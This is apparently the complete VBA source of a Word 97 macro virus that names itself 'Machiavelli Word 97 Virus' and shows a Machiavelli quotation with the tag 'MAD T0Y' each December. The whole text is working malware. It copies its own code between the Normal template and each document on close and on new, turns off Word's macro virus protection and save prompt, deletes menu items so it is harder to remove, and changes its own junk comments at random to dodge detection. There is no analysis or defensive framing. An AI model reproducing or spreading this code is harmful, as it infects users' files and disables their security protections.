   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
   On Error Resume Next
   Copy
   Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
   End Sub
   Private Sub Document_New()
   Pos = ThisDocument.Name
   If Pos = NormalTemplate.FullName Then
                                          Copy
                                          If Month(Now) = 12 Then MsgBox "In December of 1513, Niccol?Machiavelli wrote:" + vbCr + vbCr + "Virt?contro a furore" + vbCr + "Prender?l'arme, e fia el combatter corto;" + vbCr + "Ch?l'antico valore" + vbCr + "Nell'italici cor non ?ancor morto." + vbCr + vbCr + "--==<<ITALIAN PoWeR>>==--" + vbCr + vbCr + "MAD T0Y is here!", vbApplicationModal + vbInformation + vbOKOnly + vbSystemModal, "Machiavelli Word 97 Virus Version 0.1?"
   End If
   End Sub
   Private Sub Document_Open()
   On Error Resume Next
   Deprotect
   End Sub
   Private Sub Copy()
   Pos = ThisDocument.Name
   If Pos = NormalTemplate.Name Then
   ' AKFAHMDDYREPWCUCVXKEC
   ' LIRIUMRUSZGOSTYJGWWMQ
   ' YGZAOIGDNLXHUXVACKVV
      Set Start = NormalTemplate.VBProject.VBComponents(1).CodeModule
   ' OOZ
      Set Target = ActiveDocument.VBProject.VBComponents(1).CodeModule
   ' YAKPJ
                                      Else
      Set Start = ActiveDocument.VBProject.VBComponents(1).CodeModule
      Set Target = NormalTemplate.VBProject.VBComponents(1).CodeModule
   End If
   ' -=<CoPy>=-
   ' KYRZACYKZOGEZID
   ' LMRCAPQGJTXSHFFEH
   With Start
   ' HPKLHUIYXNHSNIPVMMFFTYDSBRD
   ' BPAHOENGIWQOLVTEPBECIKRBCHM
   ' JUV
   ' KLHUBYQGHSGIPOFMZZMRXLVKXFS
   ' MUDNXUPEJJILDADT
   ' BDQDJGPO
   ' QUVZLIXYORAF
   ' HTDQTRXZGRRWAZNVEOYVQFKKJME
   ' MWKMUZJQJCQBAPFOHJWJPMVUFQC
   ' JILX
       VirusCode = .Lines(1, .CountOflines)
   End With
   ' KOPOQJFJYEEMOQLYFBULMWKNUZJ
   With Target
   ' XTRXEMXRWHEUVLVYBXMRRQTEHLA
   ' BQYOSBF
   ' QTRXFNRRWIFUVLOYCXNKKJMEIMU
       .DeleteLines 1, .CountOflines
   ' ZAINYEYREQPDUCWYKYDAJIUERNK
       .InsertLines 1, VirusCode
   End With
   ' JBGJHOWXHINZPDMBFPTNDABACWS
   ' SMLIRQBTZB
   Lines = Start.CountOflines
   Randomize Timer
   ' HUVRJABL
   ' UHHVZFTDTEOAOTQ
   ' UQIZ
   ' TC
   NumberOfLines = Int(50 * Rnd) + 1
   Delete$ = False
   ' NGHVZFTCTENUOMJTRCU
   ReDim Position(NumberOfLines) As Long, Content(NumberOfLines) As String
   ' XGQNIYCCBEXUXMTSACD
   For A = 1 To NumberOfLines
   ' NONPIEIXKDLNOKXLATRLVQMTYPP
   ' VAVUR
       Randomize Timer
       Position(A) = Int(Lines * Rnd) + 1
   ' PMWUFYCFDJSTDDIVL
       Content(A) = ""
       For B = 1 To 27
   ' CU
           Randomize Timer
   ' NNNPHLPXKKSNOKXLA
   ' ZGRLQBZOPEPSWQGLLKNZBFVAAIK
           Lettera = Int((27 * Rnd) + 64)
           If Lettera = 64 And Content(A) <> "" Then Exit For
           If Lettera = 64 And Content(A) = "" Then Lettera = Lettera + 1
           Content(A) = Content(A) + Chr$(Lettera)
   ' OQLYMBASMXSNUZQQKKYBIWGWHRX
   ' E
   ' QV
   ' L
   ' CHZZSLZKQYOXQSEZYVDCOZLOMST
       Next B
   ' APVVCEGBOWSKBCNADKP
   Next A
   For A = 1 To NumberOfLines
       If Left$(VBE.SelectedVBComponent.CodeModule.Lines(A, 1), 1) = "'" Then
   ' KRRZABYKSOGXZIXZGLWCWPCONBS
          VBE.SelectedVBComponent.CodeModule.DeleteLines A, 1
          DeleteBol = True
   ' XWZRORGUMVXYUGVKC
   ' A
          Delete = Delete + 1
   ' MZHNHGCMKWOTWU
          If Delete > NumberOfLines Then Exit For
   ' JCRBAPFPHJXJPMWUFQCZXCLSDXB
       End If
   Next A
   ' OFGRFHOMDKYYLPWJUJVEREKGQHT
   ' XCKSCXBNK
   ' JUGJHNPXHHMSPDLVEOLGWAAACVS
   ' WQAWRYCUUOHVFMTKTLNAVTQ
   If DeleteBol = False Then
      For A = 1 To NumberOfLines
          VBE.SelectedVBComponent.CodeModule.InsertLines Position(A), "' " + Content(A)
   ' VBASZLLZDJYHXJSESYVDVGZZB
      Next A
   End If
   End Sub
   Private Sub Deprotect()
   Options.VirusProtection = False
   Options.SaveNormalPrompt = False
   CommandBars("Tools").Controls(12).Delete
   CommandBars("Tools").Controls(14).Delete
   CommandBars("Format").Controls(12).Delete
   End Sub
